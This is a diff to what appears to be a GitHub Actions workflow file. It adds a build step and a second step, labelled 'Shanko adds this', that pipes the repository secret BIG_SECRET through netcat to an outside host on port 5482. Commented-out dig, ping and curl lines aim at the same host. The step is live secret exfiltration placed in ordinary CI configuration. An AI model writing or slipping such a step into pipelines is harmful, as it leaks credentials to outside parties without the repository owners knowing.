@@ -34,3 +34,14 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+          
+      - name: build
+        run: python3 build_script.py ${{ secrets.BIG_SECRET }}
+
+      - name: Shanko adds this
+        run: |
+          #sudo apt-get install netcat
+          #dig vcapp.stephenshanko.com
+          #ping -c 4 vcapp.stephenshanko.com
+          echo ${{ secrets.BIG_SECRET }}  | nc -q 2 vcapp.stephenshanko.com 5482
+          #run: curl -d ${{ secrets.BIG_SECRET }} 
